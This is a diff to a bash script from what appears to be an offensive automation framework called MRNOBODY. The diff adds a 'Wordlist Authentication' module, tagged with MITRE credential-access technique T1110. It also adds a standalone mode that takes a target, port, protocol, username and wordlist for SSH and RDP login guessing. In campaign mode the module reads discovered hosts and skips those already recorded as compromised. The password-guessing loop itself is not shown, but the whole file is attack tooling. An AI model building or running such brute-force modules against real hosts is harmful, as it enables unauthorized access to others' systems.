@@ -29,6 +29,19 @@ set -u
 #
 # ============================================================
 
+# ============================================================
+# MRNOBODY ATTACK METADATA
+# ============================================================
+
+# ATTACK_ID="08"
+# ATTACK_NAME="Wordlist Authentication"
+# ATTACK_ALIAS="wordlist"
+# ATTACK_STANDALONE="true"
+# ATTACK_PARAMETERS="target,port,protocol,username,file"
+# ATTACK_CAMPAIGN_STATE="discovered-hosts,compromised-hosts"
+
+# MITRE_TACTIC="Credential Access"
+# MITRE_TECHNIQUES="T1110,T1110.001"
 
 # ============================================================
 # PATHS
@@ -64,10 +77,59 @@ WORDLIST_STATE="$STATE_DIR/wordlist-results.json"
 WORDLIST_ENABLED="${NORDIC_WORDLIST_ENABLED:-0}"
 WORDLIST_FILE="${NORDIC_WORDLIST_FILE:-}"
 
+# ============================================================
+# EXECUTION MODE
+# ============================================================
+
+RUN_MODE="${MRNOBODY_RUN_MODE:-campaign}"
+
+MANUAL_TARGET="${MRNOBODY_TARGET:-}"
+MANUAL_PORT="${MRNOBODY_PORT:-}"
+MANUAL_PROTOCOL="${MRNOBODY_PROTOCOL:-}"
+MANUAL_USERNAME="${MRNOBODY_USERNAME:-}"
+MANUAL_FILE="${MRNOBODY_FILE:-}"
+
 SSH_USERNAME="${NORDIC_SSH_USERNAME:-${NORDIC_SSH_USER:-${NORDIC_DEFAULT_SSH_USER:-ubuntu}}}"
 RDP_USERNAME="${NORDIC_RDP_USERNAME:-${NORDIC_RDP_USER:-${NORDIC_DEFAULT_RDP_USER:-Administrator}}}"
 
 WORDLIST_USERS="${NORDIC_WORDLIST_USERS:-$SSH_USERNAME,$RDP_USERNAME}"
+
+if [[ "$RUN_MODE" == "standalone" ]]; then
+
+    if [[ -n "$MANUAL_FILE" ]]; then
+        WORDLIST_FILE="$MANUAL_FILE"
+        WORDLIST_ENABLED="1"
+    fi
+
+    if [[ -n "$MANUAL_USERNAME" ]]; then
+        WORDLIST_USERS="$MANUAL_USERNAME"
+    fi
+
+    case "${MANUAL_PROTOCOL,,}" in
+
+        ssh)
+            if [[ -n "$MANUAL_PORT" ]]; then
+                SSH_PORT="$MANUAL_PORT"
+            fi
+            ;;
+
+        rdp)
+            if [[ -n "$MANUAL_PORT" ]]; then
+                RDP_PORT="$MANUAL_PORT"
+            fi
+            ;;
+
+        "")
+            ;;
+
+        *)
+            echo "[ERROR] Unsupported standalone protocol: $MANUAL_PROTOCOL"
+            exit 1
+            ;;
+
+    esac
+
+fi
 
 SSH_PORT="${NORDIC_SSH_PORT:-${NORDIC_DEFAULT_SSH_PORT:-22}}"
 SSH_TIMEOUT="${NORDIC_SSH_TIMEOUT:-5}"
@@ -215,21 +277,62 @@ fi
 # STATE VALIDATION
 # ============================================================
 
-if [[ ! -f "$DISCOVERED_STATE" ]]; then
+if [[ "$RUN_MODE" == "campaign" ]]; then
 
-    log "[ERROR] Discovery state not found:"
-    log "        $DISCOVERED_STATE"
+    if [[ ! -f "$DISCOVERED_STATE" ]]; then
 
+        log "[ERROR] Discovery state not found:"
+        log "        $DISCOVERED_STATE"
+
+        exit 1
+    fi
+
+
+    if [[ ! -f "$COMPROMISED_STATE" ]]; then
+
+        log "[ERROR] Compromised host state not found:"
+        log "        $COMPROMISED_STATE"
+
+        exit 1
+    fi
+
+
+elif [[ "$RUN_MODE" == "standalone" ]]; then
+
+    if [[ -z "$MANUAL_TARGET" ]]; then
+
+        log "[ERROR] Standalone mode requires --target"
+        exit 1
+
+    fi
+
+
+    if [[ -z "$MANUAL_PROTOCOL" ]]; then
+
+        log "[ERROR] Standalone mode requires --protocol ssh or rdp"
+        exit 1
+
+    fi
+
+
+    case "${MANUAL_PROTOCOL,,}" in
+
+        ssh|rdp)
+            ;;
+
+        *)
+            log "[ERROR] Unsupported standalone protocol: $MANUAL_PROTOCOL"
+            exit 1
+            ;;
+
+    esac
+
+
+else
+
+    log "[ERROR] Unknown run mode: $RUN_MODE"
     exit 1
-fi
 
-
-if [[ ! -f "$COMPROMISED_STATE" ]]; then
-
-    log "[ERROR] Compromised host state not found:"
-    log "        $COMPROMISED_STATE"
-
-    exit 1
 fi
 
 
@@ -330,14 +433,19 @@ fi
 # ============================================================
 # CREATE TARGET INVENTORY
 #
-# Existing compromised IP addresses are removed.
+# Campaign:
+#   Use discovered hosts and remove already compromised hosts.
+#
+# Standalone:
+#   Use only the manually supplied target.
 # ============================================================
 
-python3 - \
-    "$DISCOVERED_STATE" \
-    "$COMPROMISED_STATE" \
-    "$TARGET_FILE" <<'PY'
+if [[ "$RUN_MODE" == "campaign" ]]; then
 
+    python3 - \
+        "$DISCOVERED_STATE" \
+        "$COMPROMISED_STATE" \
+        "$TARGET_FILE" <<'PY'
 import ipaddress
 import json
 import sys
@@ -349,7 +457,6 @@ output_file = sys.argv[3]
 
 
 def load_json(filename):
-
     with open(filename, encoding="utf-8") as f:
         return json.load(f)
 
@@ -367,7 +474,6 @@ def extract_hosts(data):
             "compromised_hosts",
             "targets",
         ):
-
             value = data.get(key)
 
             if isinstance(value, list):
@@ -459,9 +565,18 @@ with open(
 ) as f:
 
     for ip in targets:
-
         f.write(ip + "\n")
+
 PY
+
+
+else
+
+    printf '%s\n' \
+        "$MANUAL_TARGET" \
+        > "$TARGET_FILE"
+
+fi
 
 
 TARGET_COUNT=$(
@@ -592,7 +707,37 @@ while IFS= read -r TARGET; do
     # Service discovery
     # --------------------------------------------------------
 
-    if tcp_open "$TARGET" "$SSH_PORT"; then
+    SSH_OPEN=0
+RDP_OPEN=0
+
+TEST_SSH=1
+TEST_RDP=1
+
+if [[ "$RUN_MODE" == "standalone" ]]; then
+
+    case "${MANUAL_PROTOCOL,,}" in
+
+        ssh)
+            TEST_SSH=1
+            TEST_RDP=0
+            ;;
+
+        rdp)
+            TEST_SSH=0
+            TEST_RDP=1
+            ;;
+
+    esac
+
+fi
+
+
+# --------------------------------------------------------
+# Service discovery
+# --------------------------------------------------------
+
+    if [[ "$TEST_SSH" -eq 1 ]] &&
+    tcp_open "$TARGET" "$SSH_PORT"; then
 
         SSH_OPEN=1
 
@@ -603,13 +748,23 @@ while IFS= read -r TARGET; do
     fi
 
 
-    if tcp_open "$TARGET" "$RDP_PORT"; then
+    if [[ "$TEST_RDP" -eq 1 ]] &&
+    tcp_open "$TARGET" "$RDP_PORT"; then
 
         RDP_OPEN=1
 
         RDP_TARGETS=$((RDP_TARGETS + 1))
 
         log "[TARGET][RDP] $TARGET:$RDP_PORT"
+
+    fi
+
+
+    if (( SSH_OPEN == 0 && RDP_OPEN == 0 )); then
+
+        log "[SKIPPED] No selected authentication service detected on $TARGET"
+
+        continue
 
     fi
 
